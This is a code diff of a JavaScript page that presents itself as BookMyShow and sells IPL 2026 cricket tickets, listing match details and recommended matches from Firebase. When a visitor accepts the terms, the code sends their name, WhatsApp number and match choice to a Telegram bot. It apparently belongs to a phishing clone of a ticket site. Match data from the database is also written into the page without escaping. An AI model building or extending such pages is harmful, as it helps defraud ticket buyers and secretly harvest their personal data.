@@ -1,6 +1,3 @@
-// 🔥 FIREBASE IMPORT (RECOMMENDED MATCHES FETCH KARNE KE LIYE)
-import { db, ref, onValue } from "./firebase.js";
-
 const container = document.getElementById('event-container');
 const footer = document.getElementById('event-footer');
 const priceBox = document.getElementById('event-price');
@@ -9,10 +6,10 @@ const popup = document.getElementById('tnc-modal');
 const box = document.getElementById('popup-box');
 
 let startY = 0;
-window.matchDataMap = {}; // Global variable matches store karne ke liye
+window.matchDataMap = {}; // Global variable
 
 // ==========================================
-// 🔥 GET FULL MATCH DATA (SAFE RECOVERY)
+// 🔥 GET FULL MATCH DATA
 // ==========================================
 let match = null;
 
@@ -24,23 +21,21 @@ try {
     console.error("LocalStorage Error", e);
 }
 
-console.log("EVENT MATCH DATA:", match);
-
 // ❌ NO MATCH FOUND
 if (!match) {
     if (container) {
-        container.innerHTML = `<div class="loading">No Match Selected. <a href="index.html">Go Back</a></div>`;
+        container.innerHTML = `<div class="loading-container"><p class="font-medium text-red-500">No Match Selected.</p><a href="index.html" class="mt-4 bg-gray-800 text-white px-4 py-2 rounded">Go Back</a></div>`;
     }
 } else {
 
-    // 🔥 IMPORTANT: SAVE ID FOR FIREBASE SYNC ON SEATS PAGE
+    // SAVE ID FOR NEXT PAGE
     if (match.id) {
         localStorage.setItem("matchId", match.id);
     }
 
     const teams = (match.title || "Match").split(' vs ');
 
-    // 🔥 RENDER UI
+    // 🔥 MAIN UI RENDER
     container.innerHTML = `
     <div style="padding: 12px 16px; background: white; font-family: 'Inter', sans-serif; padding-bottom: 80px; overflow-x: hidden;">
         
@@ -49,9 +44,7 @@ if (!match) {
         </div>
 
         <div style="margin-top: 12px;">
-            <span style="background:#f1f2f4; color: #333; padding:4px 8px; font-size:10px; font-weight: 700; border-radius:4px; text-transform: uppercase;">
-                Cricket
-            </span>
+            <span style="background:#f1f2f4; color: #333; padding:4px 8px; font-size:10px; font-weight: 700; border-radius:4px; text-transform: uppercase;">Cricket</span>
         </div>
 
         <div style="display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; border-radius: 8px; padding: 12px; margin-top: 16px;">
@@ -66,26 +59,11 @@ if (!match) {
         </div>
 
         <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 14px; font-size: 13px; color: #333; font-weight: 500;">
-            <div style="display: flex; align-items: center; gap: 12px;">
-                <svg viewBox="0 0 448 512" style="width: 16px; fill: #666;"><path d="M152 24c0-13.3-10.7-24-24-24s-24 10.7-24 24V64H64C28.7 64 0 92.7 0 128v16 48V448c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V192 128c0-35.3-28.7-64-64-64H344V24c0-13.3-10.7-24-24-24s-24 10.7-24 24V64H152V24zM48 192h352v256c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V192z"/></svg>
-                <span>${match.date || 'Sun 29 Mar 2026'}</span>
-            </div>
-            <div style="display: flex; align-items: center; gap: 12px;">
-                <svg viewBox="0 0 512 512" style="width: 16px; fill: #666;"><path d="M256 0a256 256 0 1 1 0 512A256 256 0 1 1 256 0zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"/></svg>
-                <span>${match.time || '7:30 PM'}</span>
-            </div>
-            <div style="display: flex; align-items: center; gap: 12px;">
-                <span style="font-size: 16px;">⌛</span>
-                <span>5 Hours</span>
-            </div>
-            <div style="display: flex; align-items: center; gap: 12px;">
-                <span style="font-size: 16px;">🗣️</span>
-                <span>English</span>
-            </div>
-            <div style="display: flex; align-items: flex-start; gap: 12px;">
-                <svg viewBox="0 0 384 512" style="width: 16px; fill: #666; margin-top: 2px;"><path d="M215.7 499.2C267 435 384 279.4 384 192C384 86 298 0 192 0S0 86 0 192c0 87.4 117 243 168.3 307.2c12.3 15.3 35.1 15.3 47.4 0zM192 128a64 64 0 1 1 0 128 64 64 0 1 1 0-128z"/></svg>
-                <span style="flex: 1; line-height: 1.4;">${match.venue || 'Wankhede Stadium: Mumbai'}</span>
-            </div>
+            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">📅</span><span>${match.date || 'Sun 29 Mar 2026'}</span></div>
+            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">⏰</span><span>${match.time || '7:30 PM'}</span></div>
+            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">⌛</span><span>5 Hours</span></div>
+            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">🗣️</span><span>English</span></div>
+            <div style="display: flex; align-items: flex-start; gap: 12px;"><span style="font-size:16px;">📍</span><span style="flex: 1; line-height: 1.4;">${match.venue || 'Wankhede Stadium: Mumbai'}</span></div>
         </div>
 
         <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>
@@ -120,7 +98,7 @@ if (!match) {
         <div>
             <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 10px;">About The Event</h3>
             <p style="font-size: 13px; color: #555; line-height: 1.6; margin: 0;">
-                Book tickets for <b>${teams[0] || 'Team A'} vs ${teams[1] || 'Team B'}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow. Watch the action live as ${teams[0] || 'Team A'} take on ${teams[1] || 'Team B'}...
+                Book tickets for <b>${teams[0] || 'Team A'} vs ${teams[1] || 'Team B'}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow.
             </p>
             <div style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 8px;">Read More</div>
         </div>
@@ -197,55 +175,59 @@ if (!match) {
     if (priceBox) priceBox.innerText = `₹${match.price || 0} onwards`;
 
     // ==========================================
-    // 🔥 FETCH MATCHES FROM FIREBASE FOR 'YOU MAY ALSO LIKE'
+    // 🔥 SAFE FIREBASE DYNAMIC LOAD FOR RECOMMENDATIONS
     // ==========================================
     const dynamicContainer = document.getElementById('dynamic-matches-container');
-    if (dynamicContainer) {
-        onValue(ref(db, 'matches'), (snapshot) => {
-            if (snapshot.exists()) {
-                dynamicContainer.innerHTML = ''; // Clear "Loading..." text
-                const allMatches = snapshot.val();
-                let addedCount = 0;
+    
+    // Dynamic import to prevent main UI crash if firebase.js fails
+    import('./firebase.js').then((firebaseModule) => {
+        const { db, ref, onValue } = firebaseModule;
+        
+        if (dynamicContainer) {
+            onValue(ref(db, 'matches'), (snapshot) => {
+                if (snapshot.exists()) {
+                    dynamicContainer.innerHTML = ''; 
+                    const allMatches = snapshot.val();
+                    let addedCount = 0;
 
-                for (let key in allMatches) {
-                    const m = allMatches[key];
-                    
-                    // Jo match screen pe hai, usko skip karo
-                    if (m.id === match.id || key === match.id) continue;
-                    
-                    // Max 5 matches show karna hai recommended list me
-                    if (addedCount >= 5) break;
+                    for (let key in allMatches) {
+                        const m = allMatches[key];
+                        
+                        if (m.id === match.id || key === match.id) continue;
+                        if (addedCount >= 5) break;
 
-                    const title = m.title || "Match";
-                    const matchId = m.id || key;
-                    const banner = m.banner || "https://via.placeholder.com/400x600";
-                    const date = m.date || "TBA";
-                    const price = m.price || 0;
+                        const title = m.title || "Match";
+                        const matchId = m.id || key;
+                        const banner = m.banner || "https://via.placeholder.com/400x600";
+                        const date = m.date || "TBA";
+                        const price = m.price || 0;
 
-                    // Match data memory me save karna for fast click
-                    window.matchDataMap[matchId] = m;
+                        window.matchDataMap[matchId] = m;
 
-                    const cardHtml = `
-                    <div style="min-width: 130px; width: 130px; cursor: pointer;" onclick="selectRecommendedMatch('${matchId}')">
-                        <img src="${banner}" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
-                        <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${title}</div>
-                        <div style="font-size: 11px; color: #666; margin-top: 2px;">${date}</div>
-                        <div style="font-size: 11px; color: #f84464; font-weight: bold; margin-top: 2px;">₹${price} onwards</div>
-                    </div>
-                    `;
-                    dynamicContainer.innerHTML += cardHtml;
-                    addedCount++;
+                        const cardHtml = `
+                        <div style="min-width: 130px; width: 130px; cursor: pointer;" onclick="selectRecommendedMatch('${matchId}')">
+                            <img src="${banner}" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
+                            <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${title}</div>
+                            <div style="font-size: 11px; color: #666; margin-top: 2px;">${date}</div>
+                            <div style="font-size: 11px; color: #f84464; font-weight: bold; margin-top: 2px;">₹${price} onwards</div>
+                        </div>
+                        `;
+                        dynamicContainer.innerHTML += cardHtml;
+                        addedCount++;
+                    }
+
+                    if (addedCount === 0) {
+                        dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No other matches available right now.</div>';
+                    }
+                } else {
+                    dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No matches found.</div>';
                 }
-
-                if (addedCount === 0) {
-                    dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No other matches available right now.</div>';
-                }
-
-            } else {
-                dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No matches found.</div>';
-            }
-        });
-    }
+            });
+        }
+    }).catch(err => {
+        console.warn("Firebase import failed, skipping recommendations.", err);
+        if(dynamicContainer) dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">Could not load more matches.</div>';
+    });
 
 }
 
@@ -256,7 +238,7 @@ window.selectRecommendedMatch = (id) => {
     const selected = window.matchDataMap[id];
     if(selected) {
         localStorage.setItem('selectedMatch', JSON.stringify(selected));
-        window.location.reload(); // Page reload karega naya match load karne ke liye
+        window.location.reload(); 
     }
 }
 
@@ -284,7 +266,7 @@ if (popup) {
 }
 
 // ==========================================
-// 🔥 ACCEPT → GO TO SEATS (UNTOUCHED)
+// 🔥 ACCEPT → GO TO SEATS (UNTOUCHED LOGIC)
 // ==========================================
 const acceptBtn = document.getElementById('accept-tnc-btn');
 if (acceptBtn) {
@@ -321,3 +303,55 @@ if (acceptBtn) {
                             `👤 *Name:* ${name}\n` +
                             `📞 *WhatsApp:* ${phone}\n` +
                             `🏏 *Match:* ${matchTitle}\n` +
+                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
+
+        try {
+            await fetch(url);
+        } catch (e) {
+            console.log("Telegram Error");
+        } finally {
+            closePopup();
+            localStorage.setItem('selectedMatch', JSON.stringify(match));
+            window.location.href = "seats.html";
+        }
+    };
+}
+
+// ==========================================
+// 🔥 BOOK BUTTON (UNTOUCHED)
+// ==========================================
+const bookNowBtn = document.getElementById('book-now-btn');
+if (bookNowBtn) {
+    bookNowBtn.onclick = () => {
+        openTnc();
+    };
+}
+
+// ==========================================
+// 🔥 SWIPE CLOSE LOGIC (UNTOUCHED)
+// ==========================================
+if (box) {
+    box.addEventListener('touchstart', (e) => {
+        startY = e.touches[0].clientY;
+    });
+
+    box.addEventListener('touchmove', (e) => {
+        let move = e.touches[0].clientY - startY;
+        if (move > 0) {
+            box.style.transform = `translateY(${move}px)`;
+        }
+    });
+
+    box.addEventListener('touchend', (e) => {
+        let diff = e.changedTouches[0].clientY - startY;
+
+        if (diff > 100) {
+            closePopup();
+        } else {
+            box.style.transform = 'translateY(0)';
+        }
+    });
+}
+
